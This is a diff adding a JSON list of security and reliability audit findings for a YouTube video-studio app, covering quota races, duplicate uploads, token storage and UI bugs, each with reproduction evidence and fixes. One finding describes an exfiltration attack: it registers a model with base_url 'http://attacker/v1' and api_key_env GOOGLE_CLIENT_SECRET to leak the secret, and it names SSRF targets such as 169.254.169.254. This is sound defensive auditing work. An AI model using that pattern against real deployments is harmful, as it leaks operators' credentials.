@@ -1,0 +1,128 @@
+[
+ {
+  "title": "QuotaLedger.reserve() is not atomic across OS processes \u2014 two engines overrun the daily YouTube ceiling by whole uploads",
+  "file": "apps/engine/engine/quota.py:239",
+  "severity": "critical",
+  "failure": "reserve() serializes only on self._serialised(), an asyncio.Lock that is per-process, then does _load() (SELECT) -> check() (in-memory sum) -> _record() (INSERT) in two separate sessions with no row lock, no SELECT ... FOR UPDATE, no unique/CHECK constraint. The API process and the arq worker (docker --profile full, or the in-process fallback when enqueue() returns False, or two arq workers) both read the same spend, both pass check(), both INSERT. The daily 10,000-unit ceiling is silently breached; Google then refuses a videos.insert already charged for, while the UI still shows budget.",
+  "evidence": "Confirmed the code path: reserve() at quota.py:239 wraps _load/check/_record in `async with self._serialised()` only. Multiple auditors reproduced with two+ real OS processes released on a shared wall-clock barrier against one shared SQLite ledger: with 8,400/10,000 pre-spent, both processes RESERVED (rows 85/86), ledger re-read = 11,600 units against a 10,000 limit; with limit 1,600 and four processes, all four admitted (6,400 booked). The single-process case never overruns, isolating the asyncio.Lock as the only serialization. The module docstring at :227-235 claims this exact scenario is fixed; it is not.",
+  "fix": "Make check-and-book one DB-arbitrated statement: inside one session take a day-scoped write lock (SELECT ... WHERE at >= <pacific day start> FOR UPDATE on Postgres; BEGIN IMMEDIATE on SQLite), re-sum inside that transaction, INSERT only if sum+cost<=limit else raise QuotaExceeded, commit. Keep the asyncio lock as the intra-process fast path only. Add a multiprocessing regression test asserting exactly one of two forked reservers is admitted.",
+  "bucket": "engine"
+ },
+ {
+  "title": "A publish job that FAILED after the upload landed can be uploaded to YouTube a second time with no force flag",
+  "file": "apps/engine/engine/main.py:910",
+  "severity": "critical",
+  "failure": "_existing_publish does `if status == \"failed\": continue` unconditionally, while the adjacent cancelled branch correctly guards on `_upload_landed(job)`. A publish whose upload stage is DONE (video live, id recorded) but which then failed on a later stage (ThumbnailSetStage exhausting attempts, PlaylistStage 404) is marked failed, so the gate returns None, POST /v1/jobs/{src}/publish returns 202 without ?force=true, and UploadStage runs again: a second public video on the channel plus another 1,600 quota units. The 409 that fires for interrupted/cancelled in the same state never fires here.",
+  "evidence": "Read confirms main.py:910 `if status == \"failed\": continue` with no `_upload_landed` check, versus :912 `if status == \"cancelled\" and not _upload_landed(job): continue`. An auditor added a temp test on the file's own fixtures: _published_job with upload DONE, status set to failed -> POST returned 202 and FakeYouTube recorded UPLOADS [1] (a real second upload). The mirror-image interrupted/cancelled cases are tested and pass; this one is untested, and test_a_failed_publish_does_not_block_a_retry pins the wrong invariant (failed job with no upload state, passes either way).",
+  "fix": "Replace `if status == \"failed\": continue` with `if status == \"failed\" and not _upload_landed(job): continue` so a failed-after-upload publish falls through to the _upload_landed 409. Update test_a_failed_publish_does_not_block_a_retry to use upload PENDING and add a twin with upload DONE asserting the block.",
+  "bucket": "engine"
+ },
+ {
+  "title": "Any environment variable can be exfiltrated to an attacker host via ModelSpec.api_key_env + base_url (and SSRF both directions)",
+  "file": "apps/engine/engine/api/models.py:168",
+  "severity": "high",
+  "failure": "POST /v1/models/catalogue accepts an unvalidated api_key_env and base_url. named_credential() resolves the name against the whole process environment AND the raw .env with no allowlist, and llm._credential() sends the value as Authorization: Bearer to base_url. Registering {provider:openai_compatible, base_url:http://attacker/v1, api_key_env:GOOGLE_CLIENT_SECRET} then POST /v1/models/test ships the Google OAuth client secret to the attacker \u2014 same for STUDIO_SECRET_KEY (protects every stored refresh token) or AWS_SECRET_ACCESS_KEY. base_url is equally unconstrained: write-SSRF to 127.0.0.1/169.254.169.254 and read-SSRF via GET /v1/models/ollama whose error string is returned. The poisoned spec persists to storage/routing.json. This is not the accepted 'engine is unauthenticated' item: /v1/setup/keys already allowlists env-var names for exactly this reason; the model endpoints let the same class through unchecked.",
+  "evidence": "Auditor ran a local HTTP catcher with .env GOOGLE_CLIENT_SECRET=GOCSPX-realsecret, drove the real app via TestClient: register 200 {is_local:False}, test 200 {ok:True}, catcher printed `attacker received Authorization: ['Bearer GOCSPX-realsecret']`. No credential was ever posted to the engine \u2014 only the variable name.",
+  "fix": "Constrain api_key_env at the API boundary like setup.py: require ^[A-Z][A-Z0-9_]{0,63}$ AND a suffix allowlist (_API_KEY/_TOKEN) so STUDIO_SECRET_KEY/GOOGLE_CLIENT_SECRET/OS vars are unreachable; enforce the same in named_credential. Validate base_url in AddModel/probe_ollama: require http(s) and reject hosts resolving to loopback/link-local/private ranges unless provider is ollama.",
+  "bucket": "engine"
+ },
+ {
+  "title": "cancel_job persists the API's empty mirror over a worker's row, destroying its stage outputs, cost and event log",
+  "file": "apps/engine/engine/main.py:1124",
+  "severity": "high",
+  "failure": "For a worker-dispatched job the API's job[\"states\"] is never written (_dispatch leaves it wf.initial_states() all PENDING; _project keeps the relayed view separate). cancel_job calls _persist(job), and save_job does row.states=dump_states(job[\"states\"]), row.events=job[\"events\"], row.cost_usd=_cost_of(job). Cancelling a worker render (whose own return says 'worker render continues') overwrites the worker's resume points with all-PENDING, zeroes recorded per-video cost (CLAUDE.md #5) and replaces the event log with a single workflow.cancelled frame. If the API restarts or the worker is lost before the next stage boundary (a render stage is minutes-to-an-hour), the job comes back at 0/17 stages, $0.00, unresumable \u2014 research, script, SEO, voiceover, thumbnail all re-generated and re-paid.",
+  "evidence": "Auditor ran against real SQLite persistence: a worker-written row with three DONE stages and cost 1.11, then cancel_job on a mirror in the exact state _dispatch leaves (enqueued=True, in _WORKER_OWNED, pristine states). Result: row before cancel done=3 cost=1.11 -> after cancel done=0 cost=0.0, row.events=[{type:workflow.cancelled}]. _project's own docstring (main.py:311-316) names this hazard for the relayed projection, but the pristine states map reaches the row anyway.",
+  "fix": "In cancel_job, do not write the mirror's states for a job this process is not executing. Either skip _persist when _worker_owned(job) and issue only a narrow UPDATE jobs SET status=... WHERE id=..., or have save_job refuse to replace non-empty row.states with an all-PENDING map for a job whose enqueued flag is set.",
+  "bucket": "engine"
+ },
+ {
+  "title": "The OAuth access token is written to the channels table in plaintext, contradicting the module's own rule",
+  "file": "apps/engine/engine/repository.py:498",
+  "severity": "medium",
+  "failure": "save_channel stores row.access_token = creds.access_token unencrypted while the refresh token beside it goes through crypto.encrypt(). api/publishing.py's attach_youtube_client docstring states the opposite design rule (the token 'belongs in neither a row nor an HTTP response'). Anyone reading the DB (studio.db in the storage volume, Postgres on 127.0.0.1:5432 with compose-hardcoded studio/studio, or any volume snapshot) gets ya29.\u2026 in clear. For that token's remaining ~1h lifetime it authorizes videos.insert, videos.delete, thumbnails.set and analytics \u2014 no storage/.secret_key needed. Encrypting the refresh token exists precisely so a stolen DB is not enough; this column reopens the window (CLAUDE.md #4: encrypted at rest).",
+  "evidence": "Auditor ran the real save path against SQLite with Credentials(refresh_token_encrypted=crypto.encrypt('1//REFRESH-SECRET'), access_token='ya29.LIVE-ACCESS-TOKEN') then queried the table: ('default','UC123','gAAAAABqaw-g\u2026', 'ya29.LIVE-ACCESS-TOKEN') \u2014 refresh ciphertext, access token cleartext.",
+  "fix": "Stop persisting it (simplest \u2014 nothing calls save_channel after refresh() so it is stale within the hour): drop the column write and let load_channels restore access_token=\"\", expires_at=None, sending is_fresh False so it heals via refresh(). Or encrypt it with crypto.encrypt() and matching decrypt in load_channels.",
+  "bucket": "engine"
+ },
+ {
+  "title": "Keys pasted on the last onboarding step are silently discarded by 'Done', which points the user at a button that is not there",
+  "file": "apps/web/app/welcome/welcome-flow.tsx:56",
+  "severity": "high",
+  "failure": "On /welcome step 4 (Publishing) a first-run user pastes GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET and presses Done. finish() calls only finishOnboarding() and routes away \u2014 it never calls saveCredentials, so both values are dropped and /setup shows them unset with no error. 'Skip \u2014 I'll do this later' likewise discards whatever was typed. Compounding: because setup.can_connect comes from the initial server render, Connect YouTube is disabled and the copy says 'Press Continue, then come back here from Setup' \u2014 but step 3 is last, so the Footer renders 'Done', not 'Continue'. No button on that screen saves. Contradicts the component's own docstring ('Each step saves as you leave it').",
+  "evidence": "grep shows saveCredentials at exactly one site, line 44, inside advance() only. finish() (lines 56-62) is finishOnboarding(); router.push; router.refresh with no save. Footer (388-396) renders Done/onFinish whenever step===last, and STEPS.length-1===3 is the Publishing step; the 'Continue' blurb is at line 338.",
+  "fix": "Hoist the save out of advance into a shared persist() and await it at the top of finish() (aborting on failure as advance does). Change the !can_connect copy to name the actual button and re-read setup status after save so Connect YouTube enables in place.",
+  "bucket": "web"
+ },
+ {
+  "title": "Series and New channel ship five buttons wired to nothing, including both screens' single primary action",
+  "file": "apps/web/app/series/page.tsx:17",
+  "severity": "high",
+  "failure": "Clicking 'New series' (the Header's primary action), Pause/Resume/Edit on every series card, 'Create series' on the New channel result screen (again the primary action), and the 'From a series\u2026' chip on Create (onClick={()=>{}}) produces no navigation, no request, no state change and no message. The user presses the one prominent red button and the app does nothing. This directly contradicts the codebase's own stated policy in queue/page.tsx:18-21 ('a button that does nothing is worse than no button'), which is why Queue's buttons were removed rather than left inert.",
+  "evidence": "grep '<Button' shows series lines 17, 79, 80 with no onClick and no form; new-channel:77 has no onClick. create-view.tsx:230 is Chip onClick={()=>{}}. No /series/new route exists and no series endpoint (KNOWN-ISSUES \u00a75.5 confirms no series table).",
+  "fix": "Delete these five controls the way Queue's were, leaving the read-only cards, and reinstate them with their endpoints. If 'New series' must remain as an affordance, make it a disabled Button with a title explaining series creation lands with the series endpoint.",
+  "bucket": "web"
+ },
+ {
+  "title": "'Re-run from here' streams to a closed EventSource: pipeline freezes and Publish stays enabled during the re-run",
+  "file": "apps/web/app/create-view.tsx:138",
+  "severity": "high",
+  "failure": "A job finishes, stream.closed fires and useJobStream calls source.close(). The user expands a stage and presses 'Re-run from here'. rerunFrom() succeeds (engine 200, status running) but nothing bumps attempt, nothing revalidates, and the EventSource is gone \u2014 the pipeline stays frozen on the old completed rows for the whole re-run (a render re-run is minutes). Worse: stream.status is still 'completed', so canRerun stays true (every further click enqueues another dispatch) and the Publish button stays enabled \u2014 a user can publish a video while its stages are being regenerated underneath it, the approval gate (CLAUDE.md #3) reading state that no longer exists.",
+  "evidence": "Engine on :8080, job acb5a0eb6fbf: SSE ended with stream.closed; POST .../rerun returned {status:running} and the engine began a fresh event log. In lib/use-job-stream.ts:214-217 the stream.closed listener calls source?.close() and the effect only re-runs on [jobId, attempt]; create-view.tsx's onRerun never touches attempt. grep shows no other reconnection path.",
+  "fix": "In onRerun, on result.ok call setAttempt(attempt+1) so the effect rebuilds the EventSource (the engine replays the whole log on connect), and drive stream.status back to 'running' so Publish and further re-runs are disabled until the new stream reports a terminal frame.",
+  "bucket": "web"
+ },
+ {
+  "title": "env_path() raises IndexError under the shipped Docker layout \u2014 GET and PUT /v1/setup are 500s in docker --profile full",
+  "file": "apps/engine/engine/api/setup.py:232",
+  "severity": "high",
+  "failure": "root = Path(__file__).resolve().parents[4] assumes the repo layout (apps/engine/engine/api/setup.py). In the image built by apps/engine/Dockerfile the code is at /app/engine/api/setup.py, which has only four parents, so parents[4] raises IndexError. The earlier candidates never hit (no .env COPYed in; ../../.env from /app is /.env). GET /v1/setup and PUT /v1/setup/keys both 500. lib/engine.ts get() maps any non-2xx to null, so the Setup screen renders 'The engine is not running' while the engine is running and healthy. Setup is the primary onboarding surface, unusable in the one documented 'everything including the engine' deployment.",
+  "evidence": "Auditor reproduced the container layout (copied engine/ + pyproject.toml to /app, cd /app, ran the real app under TestClient): traceback ends `IndexError: 4` at setup.py:232. With raise_server_exceptions=False: GET /v1/setup -> 500, PUT /v1/setup/keys -> 500, GET /v1/setup/diagnostics -> 200 (does not call env_path).",
+  "fix": "Replace the fixed index with a bounded walk over Path(__file__).resolve().parents picking the first entry containing a pyproject.toml/package.json marker, falling back to Path('.env').resolve(); wrap env_path so a resolution failure returns a path rather than propagating. Add a test running env_path() with __file__ patched to '/app/engine/api/setup.py'.",
+  "bucket": "engine"
+ },
+ {
+  "title": "bake() quantises each window to whole frames but places the next at the un-quantised start \u2014 a black frame at every window seam",
+  "file": "apps/engine/engine/render/compose.py:152",
+  "severity": "high",
+  "failure": "Any render with more than MAX_OPEN_SOURCES (8) source clips \u2014 i.e. every long-form video, the only case bake() exists for. A window's content is window_end-window_start seconds; composite.write_videofile(fps=30) stores floor(duration*30) frames, so the reopened VideoFileClip is up to 33ms short. The next window is still placed at its exact float window_start, leaving a hole the black ColorClip base shows through. This is the same symptom AUDIT.md \u00a74.7 says was eliminated (luma 3.7/255 at a cut), reintroduced by the memory-bounding code. Nothing exercises bake().",
+  "evidence": "Auditor ran _render_sync on 9 solid-colour 1.2s sources + 9.04s tone, aspect 1:1, decoded every frame: baked window=3 -> black_frames=[(90, 3.9)] vs nobake window=0 -> none (A/B toggling only compose.MAX_OPEN_SOURCES). Neighbouring frames 89:29 90:4 91:224. The window files themselves contain no black frame (why-w0.mp4 dark=[]) \u2014 a placement gap. Arithmetic: window_end=3.01333 rounds to 3.0 at 30fps, next window_start=3.01333, gap 0.0133s, frame 90 = t=3.000.",
+  "fix": "Stop trusting the encoded file's length. In bake(), after reopening, force the clip back to the span it was built from via _cover_span(VideoFileClip(path), window_end-window_start) so the reopened window covers [window_start, window_end) with no hole; equivalently snap window_end to a whole frame before compositing and place the next window there. Add a regression test rendering >MAX_OPEN_SOURCES sources asserting no frame below luma 20.",
+  "bucket": "engine"
+ },
+ {
+  "title": "Cancelling an in-process render returns instantly, frees the render slot, and lets the encode run to completion",
+  "file": "apps/engine/engine/workflows/media.py:199",
+  "severity": "high",
+  "failure": "RenderStage.run does `async with slots: await self._render(...)` and the render is `await asyncio.to_thread(_render_sync,...)`. asyncio.to_thread cannot be cancelled \u2014 cancel_job cancels the task, the coroutine unwinds in ~0ms, the semaphore releases, and the MoviePy encode keeps saturating the CPU to the end, writing its output and pushing progress into the cancelled job. STUDIO_MAX_CONCURRENT_RENDERS (default 2) no longer bounds real concurrency: cancel two long-form renders, start two more, and four encodes run \u2014 the 'box simply fell over' failure the setting exists to prevent. npm start starts no arq worker, so this in-process path is the default, and cancel_job returns a bare {status:cancelled} with no caveat.",
+  "evidence": "Auditor ran real compose.compose_video inside media._render_slots(): mid-render free slots=1, ffmpeg children=5; task.cancel() returned in 0.00s; immediately after cancel free slots=2, ffmpeg children=5, output written=False; t+30s output written=True (170,614 bytes), children still 5. Progress callback kept firing 28s after cancellation. Shutdown also blocks: loop.shutdown_default_executor() joins the thread, so Ctrl-C hangs until the encode finishes.",
+  "fix": "Give _render_sync a cooperative abort: pass a threading.Event into compose_video/_render_sync, check it at the top of the beat loop and before each write_videofile, raise RenderAborted when set, and have cancel_job set it and await the thread. At minimum hold the semaphore until the thread exits (release from the completion callback, not on coroutine unwind), make report() drop progress for a terminal job, and return the honest 'render continues' note.",
+  "bucket": "engine"
+ },
+ {
+  "title": "A relay ending without __done__ (or a restarted API) strands a worker job at 'running' forever: SSE never terminates, finished video unpublishable",
+  "file": "apps/engine/engine/main.py:409",
+  "severity": "high",
+  "failure": "_needs_resync gates on job.get('task') is None, but _dispatch sets task to the _relay coroutine and never clears it, so once _relay returns for any reason but a clean __done__, _needs_resync is permanently False and no read endpoint re-reads the row. Restart Redis under a worker job: pubsub.listen() raises ConnectionError, _relay's finally re-reads a still-'running' row and completes; the worker then writes 'completed'. From then GET /v1/jobs/{id} reports running forever, the SSE generator parks on waiting.wait() and never emits a terminal frame (browser spins), and POST /publish returns 409 'job is running' for a finished video on disk. Separately stream_job never calls _resync, so restarting the API mid-render replays a stale log and emits stream.closed {status:interrupted}, and use-job-stream.ts:214 closes and never reconnects. Only an API restart clears it \u2014 the second-restart failure _resync was written to eliminate.",
+  "evidence": "End-to-end with real redis-server + arq worker: Redis bounced mid-job, worker allowed to finish -> DB row completed, API mirror running, _needs_resync False, GET -> running, SSE still open no terminal frame, POST /publish -> 409. kill -9 on the worker -> relay task not done, mirror running, SSE open 6s no frame, POST /rerun -> 409. Separately, seeded a running row + two events, started the real app: GET /v1/jobs/{id}/events emitted stream.closed {status:interrupted} in 0s while GET /v1/jobs/{id} on the same process answered running (it resyncs; the stream does not).",
+  "fix": "(1) _needs_resync must treat a finished follower as no follower: `task=job.get('task'); return status in (...) and (task is None or task.done())`. (2) _relay must not end silently on a transient error \u2014 wrap subscribe/listen in a reconnect loop re-subscribing and re-checking the row, exiting only on __done__ or a terminal row status; on final give-up set the mirror from the row and _wake so stream_job emits stream.closed. (3) In stream_job, call _resync before the loop and re-poll the row inside it.",
+  "bucket": "engine"
+ },
+ {
+  "title": "The arq worker never hydrates the quota ledger, and the API never reloads it, so pre-flight checks compare against zero/stale spend",
+  "file": "apps/engine/engine/worker.py:284",
+  "severity": "high",
+  "failure": "ledger.load() is called exactly once, in main.lifespan. worker.startup() hydrates only routing and never calls ledger.load(), so YouTube._call's synchronous pre-flight ledger.check(operation) in the worker (the process that actually uploads) runs against an empty cache: a re-run of captions/thumbnail_set/playlist fires with the day fully spent and no refusal, killing the 'refuse before spending' guarantee in the one process that spends. Symmetrically the API's cache is never reloaded, so every unit the worker spends is invisible to GET /v1/quota, GET /v1/calendar, validate_move and the publish gate's can_afford for the API process's lifetime \u2014 the Calendar shows a full budget and an uploads_left that does not exist, and /calendar/auto/apply books an already-exhausted day.",
+  "evidence": "Started the real engine against a fresh SQLite DB: /v1/quota -> spent 0, remaining 10000. A separate process recorded videos.insert+thumbnails.set (db spent 1650, rows confirmed); re-curling the still-running API returned spent 0 unchanged. worker.startup() reproduced in a fresh process printed `worker ledger entries: 0 spent: 0`, check(captions.insert) PASSED; a subsequent ledger.load() in the same process then refused it. grep shows ledger.load() only at main.py.",
+  "fix": "(1) Add await ledger.load() to worker.startup() and reload (or use check_fresh) at the top of run_job_task since a long-lived worker goes stale as the API records spend. (2) Make GET /v1/quota, /v1/calendar, /calendar/slots, /calendar/auto[/apply] and the can_afford gate await ledger.load() first (one indexed range query, none are hot), or run a periodic refresh from lifespan.",
+  "bucket": "engine"
+ },
+ {
+  "title": "Linux desktop shortcut is unlaunchable when the repo path contains a space \u2014 the case its own comment claims to have fixed",
+  "file": "scripts/install-shortcut.mjs:145",
+  "severity": "high",
+  "failure": "Clone into any path with a space (~/My Studio, ~/Google Drive/Studio) and run scripts/setup.sh. It writes Exec=/home/u/My Studio/scripts/studio-launch.sh unquoted into studio.desktop. The freedesktop Exec value is tokenized on unquoted whitespace, so GLib refuses to load the entry at all \u2014 the Desktop icon shows as a plain text file / 'Failed to execute' and Studio has no working launcher, while setup.sh's closing line still says 'Double-click the Studio launcher on your Desktop.' The comment directly above the bug asserts the opposite intent (the launcher body was moved out of Exec= to dodge quoting), but the path TO the launcher is still in Exec=.",
+  "evidence": "Auditor copied install-shortcut.mjs into '.../My Studio/scripts/', ran node install-shortcut.mjs, set the launcher body to write a proof file: `gio launch studio.desktop` -> 'gio: Unable to load application information for studio.desktop', proof absent. Editing only that one line to Exec=\"...\" launched successfully (proof written). A no-space control path loaded fine. shlex.split of the Exec value returns ['/tmp/.../My','Studio',...].",
+  "fix": "Quote the Exec value per the Desktop Entry spec in the linux() template: Exec=\"${execPath.replace(/([\"$`\\\\])/g,'\\\\$1')}\". Path= and Icon= take the whole line and need no quoting.",
+  "bucket": "ops"
+ }
+]
